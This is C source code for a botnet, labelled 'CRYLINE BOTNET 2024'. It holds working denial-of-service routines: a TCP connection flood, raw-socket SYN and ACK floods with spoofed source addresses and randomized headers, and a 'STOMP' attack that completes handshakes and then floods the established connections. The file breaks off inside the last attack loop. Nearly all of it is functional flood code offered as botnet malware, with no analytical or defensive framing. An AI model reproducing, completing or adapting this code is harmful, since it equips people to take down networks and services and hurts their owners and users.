/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/ip.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <sys/socket.h>

#include "LIBRARIES.h"
#include "CHECK_SUM.h"
#include "RANDOM_GENERATOR.h"
#include "ATTACKS_CONTROLLER.h"

void __TCP_SOCKET_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    __GET_BOOL rand_len = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 26, 1);

    uint16_t GET_LENGHT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 0, 900);
    uint16_t GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);

    struct sockaddr_in _ADDRESS;

    char *GET_BUFFER = calloc(GET_LENGHT, sizeof(char));

    _ADDRESS.sin_family = AF_INET;
    _ADDRESS.sin_port = htons(GET_RPORT);
    _ADDRESS.sin_addr.s_addr = _TARGETS[0]._ADDRESS;

    struct GET_CURRENT_STATE
    {
        int GET_CURRENT_DESCRIPTOR;
        int GET_CURRENT_STATE;
        uint32_t GET_TIMEOUT;
    } GET_STATES[1000];

    int GET_CLEAR_FLAG = 0;

    for (int GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < 1000; GET_LOCAL_COUNTER++)
    {
        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR = -1;
        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 0;
        GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
    }

    while (1)
    {
        int GET_LOCAL_COUNTER = 0;

        fd_set GET_WRITE_SET;

        struct timeval GET_TIMEOUT;

        int GET_DESCRIPTOR_OF_STATE = 0;

        socklen_t GET_CONNECTION_ERROR_STATE = 0;

        int GET_ERROR_LENGHT = sizeof(int);

        for(GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < 1000; GET_LOCAL_COUNTER++)
        {
            switch(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE)
            {
                case 0:
                    if ((GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }

                    fcntl(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, F_SETFL, O_NONBLOCK | fcntl(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, F_GETFL, 0));

                    if (connect(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, (struct sockaddr *)&_ADDRESS, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR);
                        GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
                        continue;
                    }

                    GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 1;
                    GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = time(NULL);

                    break;
                case 1:
                    FD_ZERO(&GET_WRITE_SET);

                    FD_SET(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, &GET_WRITE_SET);

                    GET_TIMEOUT.tv_usec = 10;
                    GET_TIMEOUT.tv_sec = 0;

                    GET_DESCRIPTOR_OF_STATE = select(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR + 1, NULL, &GET_WRITE_SET, NULL, &GET_TIMEOUT);

                    if (GET_DESCRIPTOR_OF_STATE == 1)
                    {
                        getsockopt(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, SOL_SOCKET,SO_ERROR, &GET_CONNECTION_ERROR_STATE, &GET_ERROR_LENGHT);

                        if (GET_CONNECTION_ERROR_STATE)
                        {
                            close(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR);
                            GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 0;
                            GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
                            continue;
                        }

                        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 2;
                        continue;
                    }
                    else if (GET_DESCRIPTOR_OF_STATE == -1)
                    {
                        close(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR);

                        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 0;
                        GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
                    }

                    if (GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT + 5 < time(NULL))
                    {
                        close(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR);

                        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 0;
                        GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
                    }
                    break;
                case 2:

                    if (rand_len)
                    {
                        GET_LENGHT = ((__RANDOM_NEXT() % (GET_LENGHT - 500) + 1) + 500);
                    }
                    else
                    {
                        GET_LENGHT = GET_LENGHT;
                    }

                    __RANDOM_STRING((unsigned char*)GET_BUFFER, GET_LENGHT);

                    if (send(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR, GET_BUFFER, GET_LENGHT, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                    {
                        close(GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_DESCRIPTOR);
                        GET_STATES[GET_LOCAL_COUNTER].GET_CURRENT_STATE = 0;
                        GET_STATES[GET_LOCAL_COUNTER].GET_TIMEOUT = 0;
                    }

                    break;
            }
        }
    }
}

void __TCP_SYN_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int GET_LOCAL_COUNTER, GET_CURRENT_DESCRIPTOR;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    uint8_t GET_IP_TOS = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 2, 0);
    uint16_t GET_IP_IDENT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 3, 0xFFFF);
    uint8_t GET_IP_TTL = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 4, 64);

    __GET_BOOL GET_FRAG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 5, 1);

    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);
    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);

    uint32_t GET_PACKET_SEQ = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 17, 0xFFFF);
    uint32_t GET_PACKET_ACK = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 18, 0);

    __GET_BOOL PACKET_URG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 11, 0);
    __GET_BOOL PACKET_ACK = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 12, 0);
    __GET_BOOL PACKET_PSH = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 13, 0);
    __GET_BOOL PACKET_RST = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 14, 0);
    __GET_BOOL PACKET_SYN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 15, 1);
    __GET_BOOL PACKET_FIN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 16, 0);

    uint32_t GET_SOURCE_IP = __GET_OPT_IP(_OPTS_LENGHTS, _OPT_ARGS, 25, LOCAL_ADDRESS_SETTER);

    if ((GET_CURRENT_DESCRIPTOR = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    
    GET_LOCAL_COUNTER = 1;

    if (setsockopt(GET_CURRENT_DESCRIPTOR, IPPROTO_IP, IP_HDRINCL, &GET_LOCAL_COUNTER, sizeof(int)) == -1)
    {
        close(GET_CURRENT_DESCRIPTOR);

        return;
    }

    for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct tcphdr *TCP_HEADERS;

        uint8_t *_OPT_ARGS;

        GET_PACKET[GET_LOCAL_COUNTER] = calloc(128, sizeof(char));

        IP_HEADERS = (struct iphdr *)GET_PACKET[GET_LOCAL_COUNTER];
        TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);
        _OPT_ARGS = (uint8_t *)(TCP_HEADERS + 1);

        IP_HEADERS->version = 4;
        IP_HEADERS->ihl = 5;
        IP_HEADERS->tos = GET_IP_TOS;
        IP_HEADERS->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
        IP_HEADERS->id = htons(GET_IP_IDENT);
        IP_HEADERS->ttl = GET_IP_TTL;

        if (GET_FRAG)
        {
            IP_HEADERS->frag_off = htons(1 << 14);
        }

        IP_HEADERS->protocol = IPPROTO_TCP;
        IP_HEADERS->saddr = GET_SOURCE_IP;
        IP_HEADERS->daddr = _TARGETS[GET_LOCAL_COUNTER]._ADDRESS;

        TCP_HEADERS->source = htons(_GET_SOURCE_PORT);
        TCP_HEADERS->dest = htons(_GET_RPORT);
        TCP_HEADERS->seq = htons(GET_PACKET_SEQ);
        TCP_HEADERS->doff = 10;
        TCP_HEADERS->urg = PACKET_URG;
        TCP_HEADERS->ack = PACKET_ACK;
        TCP_HEADERS->psh = PACKET_PSH;
        TCP_HEADERS->rst = PACKET_RST;
        TCP_HEADERS->syn = PACKET_SYN;
        TCP_HEADERS->fin = PACKET_FIN;

        *_OPT_ARGS++ = 2;
        *_OPT_ARGS++ = 4;

        *((uint16_t *)_OPT_ARGS) = htons(1400 + (__RANDOM_NEXT() & 0x0f));

        _OPT_ARGS += sizeof(uint16_t);

        *_OPT_ARGS++ = 4;
        *_OPT_ARGS++ = 2;

        *_OPT_ARGS++ = 8;
        *_OPT_ARGS++ = 10;

        *((uint32_t *)_OPT_ARGS) = __RANDOM_NEXT();

        _OPT_ARGS += sizeof(uint32_t);

        *((uint32_t *)_OPT_ARGS) = 0;

        _OPT_ARGS += sizeof(uint32_t);

        *_OPT_ARGS++ = 1;

        *_OPT_ARGS++ = 3;
        *_OPT_ARGS++ = 3;
        *_OPT_ARGS++ = 6;
    }

    while (1)
    {
        for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
        {
            char *GET_TCP_STATE_PACKET = GET_PACKET[GET_LOCAL_COUNTER];

            struct iphdr *IP_HEADERS = (struct iphdr *)GET_TCP_STATE_PACKET;
            struct tcphdr *TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);
            
            if (_TARGETS[GET_LOCAL_COUNTER]._NETMASK < 32)
            {
                IP_HEADERS->daddr = htonl(ntohl(_TARGETS[GET_LOCAL_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[GET_LOCAL_COUNTER]._NETMASK));
            }

            if (GET_SOURCE_IP == 0xffffffff)
            {
                IP_HEADERS->saddr = __RANDOM_NEXT();
            }

            if (GET_IP_IDENT == 0xFFFF)
            {
                IP_HEADERS->id = __RANDOM_NEXT() & 0xFFFF;
            }

            if (_GET_SOURCE_PORT == 0xFFFF)
            {
                TCP_HEADERS->source = __RANDOM_NEXT() & 0xFFFF;
            }

            if (_GET_RPORT == 0xFFFF)
            {
                TCP_HEADERS->dest = __RANDOM_NEXT() & 0xFFFF;
            }

            if (GET_PACKET_SEQ == 0xFFFF)
            {
                TCP_HEADERS->seq = __RANDOM_NEXT();
            }

            if (GET_PACKET_ACK == 0xFFFF)
            {
                TCP_HEADERS->ack = __RANDOM_NEXT();
            }

            if (PACKET_URG)
            {
                TCP_HEADERS->urg_ptr = __RANDOM_NEXT() & 0xFFFF;
            }

            IP_HEADERS->check = 0;
            IP_HEADERS->check = __CHECK_SUM_GENERIC((uint16_t *)IP_HEADERS, sizeof(struct iphdr));

            TCP_HEADERS->check = 0;
            TCP_HEADERS->check = __CHECK_SUM_TCP_AND_UDP(IP_HEADERS, TCP_HEADERS, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);

            _TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS.sin_port = TCP_HEADERS->dest;

            sendto(GET_CURRENT_DESCRIPTOR, GET_TCP_STATE_PACKET, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&_TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
        }
    }
}

void __TCP_ACK_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int GET_LOCAL_COUNTER, GET_CURRENT_DESCRIPTOR;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    uint8_t GET_IP_TOS = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 2, 0);
    uint16_t GET_IP_IDENT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 3, 0xFFFF);
    uint8_t GET_IP_TTL = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 4, 64);

    __GET_BOOL GET_FRAG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 5, 0);

    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);
    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);

    uint32_t GET_PACKET_SEQ = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 17, 0xFFFF);
    uint32_t GET_PACKET_ACK = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 18, 0xFFFF);

    __GET_BOOL PACKET_URG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 11, 0);
    __GET_BOOL PACKET_ACK = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 12, 1);
    __GET_BOOL PACKET_PSH = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 13, 0);
    __GET_BOOL PACKET_RST = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 14, 0);
    __GET_BOOL PACKET_SYN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 15, 0);
    __GET_BOOL PACKET_FIN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 16, 0);

    int DATA_LENGHT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 0, 512);

    __GET_BOOL DATA_RANDOM = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 1, 1);

    uint32_t GET_SOURCE_IP = __GET_OPT_IP(_OPTS_LENGHTS, _OPT_ARGS, 25, LOCAL_ADDRESS_SETTER);

    if ((GET_CURRENT_DESCRIPTOR = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }

    GET_LOCAL_COUNTER = 1;

    if (setsockopt(GET_CURRENT_DESCRIPTOR, IPPROTO_IP, IP_HDRINCL, &GET_LOCAL_COUNTER, sizeof(int)) == -1)
    {
        close(GET_CURRENT_DESCRIPTOR);

        return;
    }

    for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct tcphdr *TCP_HEADERS;

        char *GET_PAYLOAD;

        GET_PACKET[GET_LOCAL_COUNTER] = calloc(1510, sizeof(char));

        IP_HEADERS = (struct iphdr *)GET_PACKET[GET_LOCAL_COUNTER];

        TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);

        GET_PAYLOAD = (char *)(TCP_HEADERS + 1);

        IP_HEADERS->version = 4;
        IP_HEADERS->ihl = 5;
        IP_HEADERS->tos = GET_IP_TOS;
        IP_HEADERS->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_LENGHT);
        IP_HEADERS->id = htons(GET_IP_IDENT);
        IP_HEADERS->ttl = GET_IP_TTL;

        if (GET_FRAG)
        {
            IP_HEADERS->frag_off = htons(1 << 14);
        }

        IP_HEADERS->protocol = IPPROTO_TCP;
        IP_HEADERS->saddr = GET_SOURCE_IP;
        IP_HEADERS->daddr = _TARGETS[GET_LOCAL_COUNTER]._ADDRESS;

        TCP_HEADERS->source = htons(_GET_SOURCE_PORT);
        TCP_HEADERS->dest = htons(_GET_RPORT);
        TCP_HEADERS->seq = htons(GET_PACKET_SEQ);
        TCP_HEADERS->doff = 5;
        TCP_HEADERS->urg = PACKET_URG;
        TCP_HEADERS->ack = PACKET_ACK;
        TCP_HEADERS->psh = PACKET_PSH;
        TCP_HEADERS->rst = PACKET_RST;
        TCP_HEADERS->syn = PACKET_SYN;
        TCP_HEADERS->fin = PACKET_FIN;
        TCP_HEADERS->window = __RANDOM_NEXT() & 0xFFFF;

        if (PACKET_PSH)
        {
            TCP_HEADERS->psh = 1;
        }

        __RANDOM_STRING(GET_PAYLOAD, DATA_LENGHT);
    }

    while (1)
    {
        for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
        {
            char *GET_TCP_STATE_PACKET = GET_PACKET[GET_LOCAL_COUNTER];

            struct iphdr *IP_HEADERS = (struct iphdr *)GET_TCP_STATE_PACKET;
            struct tcphdr *TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);

            char *GET_LOCAL_DATA = (char *)(TCP_HEADERS + 1);

            if (_TARGETS[GET_LOCAL_COUNTER]._NETMASK < 32)
            {
                IP_HEADERS->daddr = htonl(ntohl(_TARGETS[GET_LOCAL_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[GET_LOCAL_COUNTER]._NETMASK));
            }

            if (GET_SOURCE_IP == 0xffffffff)
            {
                IP_HEADERS->saddr = __RANDOM_NEXT();
            }
            if (GET_IP_IDENT == 0xFFFF)
            {
                IP_HEADERS->id = __RANDOM_NEXT() & 0xFFFF;
            }
            if (_GET_SOURCE_PORT == 0xFFFF)
            {
                TCP_HEADERS->source = __RANDOM_NEXT() & 0xFFFF;
            }
            if (_GET_RPORT == 0xFFFF)
            {
                TCP_HEADERS->dest = __RANDOM_NEXT() & 0xFFFF;
            }
            if (GET_PACKET_SEQ == 0xFFFF)
            {
                TCP_HEADERS->seq = __RANDOM_NEXT();
            }
            if (GET_PACKET_ACK == 0xFFFF)
            {
                TCP_HEADERS->ack = __RANDOM_NEXT();
            }

            if (DATA_RANDOM)
            {
                __RANDOM_STRING(GET_LOCAL_DATA, DATA_LENGHT);
            }

            IP_HEADERS->check = 0;
            IP_HEADERS->check = __CHECK_SUM_GENERIC((uint16_t *)IP_HEADERS, sizeof(struct iphdr));

            TCP_HEADERS->check = 0;
            TCP_HEADERS->check = __CHECK_SUM_TCP_AND_UDP(IP_HEADERS, TCP_HEADERS, htons(sizeof(struct tcphdr) + DATA_LENGHT), sizeof(struct tcphdr) + DATA_LENGHT);

            _TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS.sin_port = TCP_HEADERS->dest;
            sendto(GET_CURRENT_DESCRIPTOR, GET_TCP_STATE_PACKET, sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_LENGHT, MSG_NOSIGNAL, (struct sockaddr *)&_TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
        }
    }
}

void __TCP_STOMP_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int GET_LOCAL_COUNTER, GET_RECV_DESCRIPTOR;

    struct __DATA *stomp_data = calloc(_TARGETS_LENGHT, sizeof(struct __DATA));

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    uint8_t GET_IP_TOS = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 2, 0);
    uint16_t GET_IP_IDENT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 3, 0xFFFF);
    uint8_t GET_IP_TTL = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 4, 64);

    __GET_BOOL GET_FRAG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 5, 1);

    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);

    __GET_BOOL PACKET_URG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 11, 0);
    __GET_BOOL PACKET_ACK = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 12, 1);
    __GET_BOOL PACKET_PSH = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 13, 1);
    __GET_BOOL PACKET_RST = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 14, 0);
    __GET_BOOL PACKET_SYN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 15, 0);
    __GET_BOOL PACKET_FIN = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 16, 0);

    int DATA_LENGHT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 0, 768);

    __GET_BOOL DATA_RANDOM = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 1, 1);

    if ((GET_RECV_DESCRIPTOR = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }

    GET_LOCAL_COUNTER = 1;

    if (setsockopt(GET_RECV_DESCRIPTOR, IPPROTO_IP, IP_HDRINCL, &GET_LOCAL_COUNTER, sizeof(int)) == -1)
    {
        close(GET_RECV_DESCRIPTOR);
        return;
    }

    for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
    {
        int GET_CURRENT_DESCRIPTOR;

        struct sockaddr_in _ADDRESS, GET_RECV_ADDRESS;

        socklen_t GET_RECV_ADDRESS_LENGHT;

        char GET_LOCAL_PACKET_BUFFER[256];

        time_t GET_RECV_TIMEOUT;

        _LOCAL_INIT:

        if ((GET_CURRENT_DESCRIPTOR = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
            continue;
        }

        fcntl(GET_CURRENT_DESCRIPTOR, F_SETFL, fcntl(GET_CURRENT_DESCRIPTOR, F_GETFL, 0) | O_NONBLOCK);
 
        _ADDRESS.sin_family = AF_INET;

        if (_TARGETS[GET_LOCAL_COUNTER]._NETMASK < 32)
        {
            _ADDRESS.sin_addr.s_addr = htonl(ntohl(_TARGETS[GET_LOCAL_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[GET_LOCAL_COUNTER]._NETMASK));
        }
        else
        {
            _ADDRESS.sin_addr.s_addr = _TARGETS[GET_LOCAL_COUNTER]._ADDRESS;
        }

        if (_GET_RPORT == 0xFFFF)
        {
            _ADDRESS.sin_port = __RANDOM_NEXT() & 0xFFFF;
        }
        else
        {
            _ADDRESS.sin_port = htons(_GET_RPORT);
        }

        connect(GET_CURRENT_DESCRIPTOR, (struct sockaddr *)&_ADDRESS, sizeof(struct sockaddr_in));

        GET_RECV_TIMEOUT = time(NULL);

        while (1)
        {
            int GET_RETURN_CODE;

            GET_RECV_ADDRESS_LENGHT = sizeof(struct sockaddr_in);

            GET_RETURN_CODE = recvfrom(GET_RECV_DESCRIPTOR, GET_LOCAL_PACKET_BUFFER, sizeof(GET_LOCAL_PACKET_BUFFER), MSG_NOSIGNAL, (struct sockaddr *)&GET_RECV_ADDRESS, &GET_RECV_ADDRESS_LENGHT);
            
            if (GET_RETURN_CODE == -1)
            {
                return;
            }

            if (GET_RECV_ADDRESS.sin_addr.s_addr == _ADDRESS.sin_addr.s_addr && GET_RETURN_CODE > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
            {
                struct tcphdr *TCP_HEADERS = (struct tcphdr *)(GET_LOCAL_PACKET_BUFFER + sizeof(struct iphdr));

                if (TCP_HEADERS->source == _ADDRESS.sin_port)
                {
                    if (TCP_HEADERS->syn && TCP_HEADERS->ack)
                    {
                        struct iphdr *IP_HEADERS;
                        struct tcphdr *TCP_HEADERS;

                        char *GET_PAYLOAD;

                        stomp_data[GET_LOCAL_COUNTER]._ADDRESS = _ADDRESS.sin_addr.s_addr;
                        stomp_data[GET_LOCAL_COUNTER]._GET_SEQ = ntohl(TCP_HEADERS->seq);
                        stomp_data[GET_LOCAL_COUNTER]._GET_ACK = ntohl(TCP_HEADERS->ack);
                        stomp_data[GET_LOCAL_COUNTER]._GET_SOURCE_PORT = TCP_HEADERS->dest;
                        stomp_data[GET_LOCAL_COUNTER]._GET_RPORT = _ADDRESS.sin_port;

                        GET_PACKET[GET_LOCAL_COUNTER] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_LENGHT);

                        IP_HEADERS = (struct iphdr *)GET_PACKET[GET_LOCAL_COUNTER];

                        TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);

                        GET_PAYLOAD = (char *)(TCP_HEADERS + 1);

                        IP_HEADERS->version = 4;
                        IP_HEADERS->ihl = 5;
                        IP_HEADERS->tos = GET_IP_TOS;
                        IP_HEADERS->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_LENGHT);
                        IP_HEADERS->id = htons(GET_IP_IDENT);
                        IP_HEADERS->ttl = GET_IP_TTL;

                        if (GET_FRAG)
                        {
                            IP_HEADERS->frag_off = htons(1 << 14);
                        }

                        IP_HEADERS->protocol = IPPROTO_TCP;
                        IP_HEADERS->saddr = LOCAL_ADDRESS_SETTER;
                        IP_HEADERS->daddr = stomp_data[GET_LOCAL_COUNTER]._ADDRESS;

                        TCP_HEADERS->source = stomp_data[GET_LOCAL_COUNTER]._GET_SOURCE_PORT;
                        TCP_HEADERS->dest = stomp_data[GET_LOCAL_COUNTER]._GET_RPORT;
                        TCP_HEADERS->seq = stomp_data[GET_LOCAL_COUNTER]._GET_ACK;
                        TCP_HEADERS->ack = stomp_data[GET_LOCAL_COUNTER]._GET_SEQ;
                        TCP_HEADERS->doff = 8;
                        TCP_HEADERS->fin = 1;
                        TCP_HEADERS->ack = 1;
                        TCP_HEADERS->window = __RANDOM_NEXT() & 0xFFFF;
                        TCP_HEADERS->urg = PACKET_URG;
                        TCP_HEADERS->ack = PACKET_ACK;
                        TCP_HEADERS->psh = PACKET_PSH;
                        TCP_HEADERS->rst = PACKET_RST;
                        TCP_HEADERS->syn = PACKET_SYN;
                        TCP_HEADERS->fin = PACKET_FIN;

                        __RANDOM_STRING(GET_PAYLOAD, DATA_LENGHT);

                        break;
                    }
                    else if (TCP_HEADERS->fin || TCP_HEADERS->rst)
                    {
                        close(GET_CURRENT_DESCRIPTOR);

                        goto _LOCAL_INIT;
                    }
                }
            }

            if (time(NULL) - GET_RECV_TIMEOUT > 10)
            {
                close(GET_CURRENT_DESCRIPTOR);

                goto _LOCAL_INIT;
            }
        }
    }

    while (1)
    {
        for (GET_LOCAL_COUNTER = 0; GET_LOCAL_COUNTER < _TARGETS_LENGHT; GET_LOCAL_COUNTER++)
        {
            char *GET_TCP_STATE_PACKET = GET_PACKET[GET_LOCAL_COUNTER];

            struct iphdr *IP_HEADERS = (struct iphdr *)GET_TCP_STATE_PACKET;
            struct tcphdr *TCP_HEADERS = (struct tcphdr *)(IP_HEADERS + 1);

            char *GET_LOCAL_DATA = (char *)(TCP_HEADERS + 1);

            if (GET_IP_IDENT == 0xFFFF)
            {
                IP_HEADERS->id = __RANDOM_NEXT() & 0xFFFF;
            }

            if (DATA_RANDOM)
            {
                __RANDOM_STRING(GET_LOCAL_DATA, DATA_LENGHT);
            }

            IP_HEADERS->check = 0;
            IP_HEADERS->check = __CHECK_SUM_GENERIC((uint16_t *)IP_HEADERS, sizeof(struct iphdr));

            TCP_HEADERS->seq = htons(stomp_data[GET_LOCAL_COUNTER]._GET_SEQ++);
            TCP_HEADERS->ack = htons(stomp_data[GET_LOCAL_COUNTER]._GET_ACK);
            TCP_HEADERS->check = 0;
            TCP_HEADERS->check = __CHECK_SUM_TCP_AND_UDP(IP_HEADERS, TCP_HEADERS, htons(sizeof(struct tcphdr) + DATA_LENGHT), sizeof(struct tcphdr) + DATA_LENGHT);

            _TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS.sin_port = TCP_HEADERS->dest;

